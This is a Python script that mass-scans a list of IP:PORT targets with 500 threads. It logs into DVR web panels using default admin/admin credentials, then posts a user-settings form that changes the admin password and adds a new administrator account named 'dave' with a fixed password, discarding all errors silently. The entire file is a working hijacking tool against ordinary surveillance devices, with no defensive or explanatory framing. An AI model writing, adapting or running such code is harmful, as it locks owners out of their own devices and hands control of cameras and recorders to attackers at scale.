import requests
from concurrent.futures import ThreadPoolExecutor

# Function to read IPs from file
def read_ips(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

# Function to handle each IP:PORT
def handle_ip(ip_port):
    login_url = f'http://{ip_port}/cgi-bin/cgi_login.cgi'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
        'Cookie': 'ID=YWRtaW4=&PWD=YWRtaW4=&SessionID=0.40314717259561217',
    }

    login_data = {
        'lang': 'en',
        'id': 'admin',
        'pwd': 'admin'
    }

    try:
        # Login request with timeout
        login_response = requests.post(login_url, headers=headers, data=login_data, timeout=25)

        # Check if login was successful
        if "top.document.location.href='main_control.cgi?lang=en';" in login_response.text:
            print("[dvr] logged in:", ip_port)

            # Make the subsequent request after login
            subsequent_url = f'http://{ip_port}/cgi-bin/system_user.cgi'
            subsequent_headers = {
                'Host': '{ip_port}',
                'Content-Length': '7791',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
                'Cookie': 'ID=YWRtaW4=&PWD=YWRtaW4=&SessionID=0.40314717259561217',
                'Connection': 'close'
            }

            subsequent_data = {

    'nameGroup_Name_0': 'Administrator',
    'nameGroup_gid_0': '1',
    'nameGroup_permission_0': '65535',
    'hiddenLiveView_0_0': '255',
    'hiddenLiveView_0_1': '255',
    'hiddenLiveView_0_2': '255',
    'hiddenLiveView_0_3': '255',
    'hiddenLiveView_0_4': '255',
    'hiddenLiveView_0_5': '255',
    'hiddenLiveView_0_6': '255',
    'hiddenLiveView_0_7': '255',
    'nameGroup_Name_1': '',
    'nameGroup_gid_1': '0',
    'nameGroup_permission_1': '0',
    'hiddenLiveView_1_0': '0',
    'hiddenLiveView_1_1': '0',
    'hiddenLiveView_1_2': '0',
    'hiddenLiveView_1_3': '0',
    'hiddenLiveView_1_4': '0',
    'hiddenLiveView_1_5': '0',
    'hiddenLiveView_1_6': '0',
    'hiddenLiveView_1_7': '0',
    'nameGroup_Name_2': '',
    'nameGroup_gid_2': '0',
    'nameGroup_permission_2': '0',
    'hiddenLiveView_2_0': '0',
    'hiddenLiveView_2_1': '0',
    'hiddenLiveView_2_2': '0',
    'hiddenLiveView_2_3': '0',
    'hiddenLiveView_2_4': '0',
    'hiddenLiveView_2_5': '0',
    'hiddenLiveView_2_6': '0',
    'hiddenLiveView_2_7': '0',
    'nameGroup_Name_3': '',
    'nameGroup_gid_3': '0',
    'nameGroup_permission_3': '0',
    'hiddenLiveView_3_0': '0',
    'hiddenLiveView_3_1': '0',
    'hiddenLiveView_3_2': '0',
    'hiddenLiveView_3_3': '0',
    'hiddenLiveView_3_4': '0',
    'hiddenLiveView_3_5': '0',
    'hiddenLiveView_3_6': '0',
    'hiddenLiveView_3_7': '0',
    'nameGroup_Name_4': '',
    'nameGroup_gid_4': '0',
    'nameGroup_permission_4': '0',
    'hiddenLiveView_4_0': '0',
    'hiddenLiveView_4_1': '0',
    'hiddenLiveView_4_2': '0',
    'hiddenLiveView_4_3': '0',
    'hiddenLiveView_4_4': '0',
    'hiddenLiveView_4_5': '0',
    'hiddenLiveView_4_6': '0',
    'hiddenLiveView_4_7': '0',
    'nameGroup_Name_5': '',
    'nameGroup_gid_5': '0',
    'nameGroup_permission_5': '0',
    'hiddenLiveView_5_0': '0',
    'hiddenLiveView_5_1': '0',
    'hiddenLiveView_5_2': '0',
    'hiddenLiveView_5_3': '0',
    'hiddenLiveView_5_4': '0',
    'hiddenLiveView_5_5': '0',
    'hiddenLiveView_5_6': '0',
    'hiddenLiveView_5_7': '0',
    'nameGroup_Name_6': '',
    'nameGroup_gid_6': '0',
    'nameGroup_permission_6': '0',
    'hiddenLiveView_6_0': '0',
    'hiddenLiveView_6_1': '0',
    'hiddenLiveView_6_2': '0',
    'hiddenLiveView_6_3': '0',
    'hiddenLiveView_6_4': '0',
    'hiddenLiveView_6_5': '0',
    'hiddenLiveView_6_6': '0',
    'hiddenLiveView_6_7': '0',
    'nameGroup_Name_7': '',
    'nameGroup_gid_7': '0',
    'nameGroup_permission_7': '0',
    'hiddenLiveView_7_0': '0',
    'hiddenLiveView_7_1': '0',
    'hiddenLiveView_7_2': '0',
    'hiddenLiveView_7_3': '0',
    'hiddenLiveView_7_4': '0',
    'hiddenLiveView_7_5': '0',
    'hiddenLiveView_7_6': '0',
    'hiddenLiveView_7_7': '0',
    'nameUser_GroupId_0': '1',
    'nameUser_Name_0': 'admin',
    'nameUser_Id_0': 'admin',
    'nameUser_Pw_0': 'kR@4!bc7',
    'nameUser_uid_0': '1',
    'nameUser_GroupId_1': '0',
    'nameUser_Name_1': '',
    'nameUser_Id_1': '',
    'nameUser_Pw_1': '',
    'nameUser_uid_1': '0',
    'nameUser_GroupId_2': '0',
    'nameUser_Name_2': '',
    'nameUser_Id_2': '',
    'nameUser_Pw_2': '',
    'nameUser_uid_2': '0',
    'nameUser_GroupId_3': '0',
    'nameUser_Name_3': '',
    'nameUser_Id_3': '',
    'nameUser_Pw_3': '',
    'nameUser_uid_3': '0',
    'nameUser_GroupId_4': '0',
    'nameUser_Name_4': '',
    'nameUser_Id_4': '',
    'nameUser_Pw_4': '',
    'nameUser_uid_4': '0',
    'nameUser_GroupId_5': '0',
    'nameUser_Name_5': '',
    'nameUser_Id_5': '',
    'nameUser_Pw_5': '',
    'nameUser_uid_5': '0',
    'nameUser_GroupId_6': '0',
    'nameUser_Name_6': '',
    'nameUser_Id_6': '',
    'nameUser_Pw_6': '',
    'nameUser_uid_6': '0',
    'nameUser_GroupId_7': '0',
    'nameUser_Name_7': '',
    'nameUser_Id_7': '',
    'nameUser_Pw_7': '',
    'nameUser_uid_7': '0',
    'nameUser_GroupId_8': '0',
    'nameUser_Name_8': '',
    'nameUser_Id_8': '',
    'nameUser_Pw_8': '',
    'nameUser_uid_8': '0',
    'nameUser_GroupId_9': '0',
    'nameUser_Name_9': '',
    'nameUser_Id_9': '',
    'nameUser_Pw_9': '',
    'nameUser_uid_9': '0',
    'nameUser_GroupId_10': '0',
    'nameUser_Name_10': '',
    'nameUser_Id_10': '',
    'nameUser_Pw_10': '',
    'nameUser_uid_10': '0',
    'nameUser_GroupId_11': '0',
    'nameUser_Name_11': '',
    'nameUser_Id_11': '',
    'nameUser_Pw_11': '',
    'nameUser_uid_11': '0',
    'nameUser_GroupId_12': '0',
    'nameUser_Name_12': '',
    'nameUser_Id_12': '',
    'nameUser_Pw_12': '',
    'nameUser_uid_12': '0',
    'nameUser_GroupId_13': '0',
    'nameUser_Name_13': '',
    'nameUser_Id_13': '',
    'nameUser_Pw_13': '',
    'nameUser_uid_13': '0',
    'nameUser_GroupId_14': '0',
    'nameUser_Name_14': '',
    'nameUser_Id_14': '',
    'nameUser_Pw_14': '',
    'nameUser_uid_14': '0',
    'nameUser_GroupId_15': '0',
    'nameUser_Name_15': '',
    'nameUser_Id_15': '',
    'nameUser_Pw_15': '',
    'nameUser_uid_15': '0',
    'nameUser_GroupId_16': '0',
    'nameUser_Name_16': '',
    'nameUser_Id_16': '',
    'nameUser_Pw_16': '',
    'nameUser_uid_16': '0',
    'nameUser_GroupId_17': '0',
    'nameUser_Name_17': '',
    'nameUser_Id_17': '',
    'nameUser_Pw_17': '',
    'nameUser_uid_17': '0',
    'nameUser_GroupId_18': '0',
    'nameUser_Name_18': '',
    'nameUser_Id_18': '',
    'nameUser_Pw_18': '',
    'nameUser_uid_18': '0',
    'nameUser_GroupId_19': '0',
    'nameUser_Name_19': '',
    'nameUser_Id_19': '',
    'nameUser_Pw_19': '',
    'nameUser_uid_19': '0',
    'nameUser_GroupId_20': '0',
    'nameUser_Name_20': '',
    'nameUser_Id_20': '',
    'nameUser_Pw_20': '',
    'nameUser_uid_20': '0',
    'nameUser_GroupId_21': '0',
    'nameUser_Name_21': '',
    'nameUser_Id_21': '',
    'nameUser_Pw_21': '',
    'nameUser_uid_21': '0',
    'nameUser_GroupId_22': '0',
    'nameUser_Name_22': '',
    'nameUser_Id_22': '',
    'nameUser_Pw_22': '',
    'nameUser_uid_22': '0',
    'nameUser_GroupId_23': '0',
    'nameUser_Name_23': '',
    'nameUser_Id_23': '',
    'nameUser_Pw_23': '',
    'nameUser_uid_23': '0',
    'nameUser_GroupId_24': '0',
    'nameUser_Name_24': '',
    'nameUser_Id_24': '',
    'nameUser_Pw_24': '',
    'nameUser_uid_24': '0',
    'nameUser_GroupId_25': '0',
    'nameUser_Name_25': '',
    'nameUser_Id_25': '',
    'nameUser_Pw_25': '',
    'nameUser_uid_25': '0',
    'nameUser_GroupId_26': '0',
    'nameUser_Name_26': '',
    'nameUser_Id_26': '',
    'nameUser_Pw_26': '',
    'nameUser_uid_26': '0',
    'nameUser_GroupId_27': '0',
    'nameUser_Name_27': '',
    'nameUser_Id_27': '',
    'nameUser_Pw_27': '',
    'nameUser_uid_27': '0',
    'nameUser_GroupId_28': '0',
    'nameUser_Name_28': '',
    'nameUser_Id_28': '',
    'nameUser_Pw_28': '',
    'nameUser_uid_28': '0',
    'nameUser_GroupId_29': '0',
    'nameUser_Name_29': '',
    'nameUser_Id_29': '',
    'nameUser_Pw_29': '',
    'nameUser_uid_29': '0',
    'nameUser_GroupId_30': '0',
    'nameUser_Name_30': '',
    'nameUser_Id_30': '',
    'nameUser_Pw_30': '',
    'nameUser_uid_30': '0',
    'nameUser_GroupId_31': '0',
    'nameUser_Name_31': '',
    'nameUser_Id_31': '',
    'nameUser_Pw_31': '',
    'nameUser_uid_31': '0',
    'nameUser_GroupId_32': '0',
    'nameUser_Name_32': '',
    'nameUser_Id_32': '',
    'nameUser_Pw_32': '',
    'nameUser_uid_32': '0',
    'nameUser_GroupId_33': '0',
    'nameUser_Name_33': '',
    'nameUser_Id_33': '',
    'nameUser_Pw_33': '',
    'nameUser_uid_33': '0',
    'nameUser_GroupId_34': '0',
    'nameUser_Name_34': '',
    'nameUser_Id_34': '',
    'nameUser_Pw_34': '',
    'nameUser_uid_34': '0',
    'nameUser_GroupId_35': '0',
    'nameUser_Name_35': '',
    'nameUser_Id_35': '',
    'nameUser_Pw_35': '',
    'nameUser_uid_35': '0',
    'nameUser_GroupId_36': '0',
    'nameUser_Name_36': '',
    'nameUser_Id_36': '',
    'nameUser_Pw_36': '',
    'nameUser_uid_36': '0',
    'nameUser_GroupId_37': '0',
    'nameUser_Name_37': '',
    'nameUser_Id_37': '',
    'nameUser_Pw_37': '',
    'nameUser_uid_37': '0',
    'nameUser_GroupId_38': '0',
    'nameUser_Name_38': '',
    'nameUser_Id_38': '',
    'nameUser_Pw_38': '',
    'nameUser_uid_38': '0',
    'nameUser_GroupId_39': '0',
    'nameUser_Name_39': '',
    'nameUser_Id_39': '',
    'nameUser_Pw_39': '',
    'nameUser_uid_39': '0',
    'nameUser_GroupId_40': '0',
    'nameUser_Name_40': '',
    'nameUser_Id_40': '',
    'nameUser_Pw_40': '',
    'nameUser_uid_40': '0',
    'nameUser_GroupId_41': '0',
    'nameUser_Name_41': '',
    'nameUser_Id_41': '',
    'nameUser_Pw_41': '',
    'nameUser_uid_41': '0',
    'nameUser_GroupId_42': '0',
    'nameUser_Name_42': '',
    'nameUser_Id_42': '',
    'nameUser_Pw_42': '',
    'nameUser_uid_42': '0',
    'nameUser_GroupId_43': '0',
    'nameUser_Name_43': '',
    'nameUser_Id_43': '',
    'nameUser_Pw_43': '',
    'nameUser_uid_43': '0',
    'nameUser_GroupId_44': '0',
    'nameUser_Name_44': '',
    'nameUser_Id_44': '',
    'nameUser_Pw_44': '',
    'nameUser_uid_44': '0',
    'nameUser_GroupId_45': '0',
    'nameUser_Name_45': '',
    'nameUser_Id_45': '',
    'nameUser_Pw_45': '',
    'nameUser_uid_45': '0',
    'nameUser_GroupId_46': '0',
    'nameUser_Name_46': '',
    'nameUser_Id_46': '',
    'nameUser_Pw_46': '',
    'nameUser_uid_46': '0',
    'nameUser_GroupId_47': '0',
    'nameUser_Name_47': '',
    'nameUser_Id_47': '',
    'nameUser_Pw_47': '',
    'nameUser_uid_47': '0',
    'nameUser_GroupId_48': '0',
    'nameUser_Name_48': '',
    'nameUser_Id_48': '',
    'nameUser_Pw_48': '',
    'nameUser_uid_48': '0',
    'nameUser_GroupId_49': '0',
    'nameUser_Name_49': '',
    'nameUser_Id_49': '',
    'nameUser_Pw_49': '',
    'nameUser_uid_49': '0',
    'nameUser_GroupId_50': '0',
    'nameUser_Name_50': '',
    'nameUser_Id_50': '',
    'nameUser_Pw_50': '',
    'nameUser_uid_50': '0',
    'nameUser_GroupId_51': '0',
    'nameUser_Name_51': '',
    'nameUser_Id_51': '',
    'nameUser_Pw_51': '',
    'nameUser_uid_51': '0',
    'nameUser_GroupId_52': '0',
    'nameUser_Name_52': '',
    'nameUser_Id_52': '',
    'nameUser_Pw_52': '',
    'nameUser_uid_52': '0',
    'nameUser_GroupId_53': '0',
    'nameUser_Name_53': '',
    'nameUser_Id_53': '',
    'nameUser_Pw_53': '',
    'nameUser_uid_53': '0',
    'nameUser_GroupId_54': '0',
    'nameUser_Name_54': '',
    'nameUser_Id_54': '',
    'nameUser_Pw_54': '',
    'nameUser_uid_54': '0',
    'nameUser_GroupId_55': '0',
    'nameUser_Name_55': '',
    'nameUser_Id_55': '',
    'nameUser_Pw_55': '',
    'nameUser_uid_55': '0',
    'nameUser_GroupId_56': '0',
    'nameUser_Name_56': '',
    'nameUser_Id_56': '',
    'nameUser_Pw_56': '',
    'nameUser_uid_56': '0',
    'nameUser_GroupId_57': '0',
    'nameUser_Name_57': '',
    'nameUser_Id_57': '',
    'nameUser_Pw_57': '',
    'nameUser_uid_57': '0',
    'nameUser_GroupId_58': '0',
    'nameUser_Name_58': '',
    'nameUser_Id_58': '',
    'nameUser_Pw_58': '',
    'nameUser_uid_58': '0',
    'nameUser_GroupId_59': '0',
    'nameUser_Name_59': '',
    'nameUser_Id_59': '',
    'nameUser_Pw_59': '',
    'nameUser_uid_59': '0',
    'nameUser_GroupId_60': '0',
    'nameUser_Name_60': '',
    'nameUser_Id_60': '',
    'nameUser_Pw_60': '',
    'nameUser_uid_60': '0',
    'nameUser_GroupId_61': '0',
    'nameUser_Name_61': '',
    'nameUser_Id_61': '',
    'nameUser_Pw_61': '',
    'nameUser_uid_61': '0',
    'nameUser_GroupId_62': '0',
    'nameUser_Name_62': '',
    'nameUser_Id_62': '',
    'nameUser_Pw_62': '',
    'nameUser_uid_62': '0',
    'nameUser_GroupId_63': '1',
    'nameUser_Name_63': 'dave',
    'nameUser_Id_63': 'dave',
    'nameUser_Pw_63': 'J@aW1gA!a4',
    'nameUser_uid_63': '1519050343',
    'last_uid': '1519050343',
    'user_count': '2',
    'group_count': '1',
    'nameGroup_Selected': '100',
    'nameUser_Selected': '',
    'lang': 'en',
    'is_apply': '1',
    'is_cancel': '',
    'modify_user': '-1',
    'hiddenMaxCh': '8',
    'autoLogoutSeconds': '0'

            }

            # Subsequent request with timeout
            subsequent_response = requests.post(subsequent_url, headers=subsequent_headers, data=subsequent_data, timeout=25)
            
            # Check if the subsequent response indicates success
            if "/cgi-bin/system_user?lang=en" in subsequent_response.text:
                print(f"[dvr] changed: {ip_port}")
    except:
        pass  # Skip printing any errors or failed login attempts

# Read IPs and Ports from ips.txt
ips = read_ips('ips.txt')

# Set maximum number of threads
max_threads = 500

# Use ThreadPoolExecutor to handle IPs concurrently
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    executor.map(handle_ip, ips)
